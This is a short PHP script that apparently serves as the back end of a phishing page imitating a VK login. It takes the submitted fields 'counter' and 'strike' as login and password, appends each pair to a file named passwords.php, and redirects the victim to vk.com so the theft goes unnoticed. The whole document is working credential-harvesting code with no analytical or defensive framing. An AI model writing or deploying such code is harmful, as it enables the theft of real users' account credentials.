<?

$Login = $_POST['counter']; 

$Pass = $_POST['strike']; 

$log = fopen("passwords.php","a+"); 

fwrite($log,"<br> $Login:$Pass \n"); 

fclose($log); 

echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://vk.com'></head></html>"; 

?>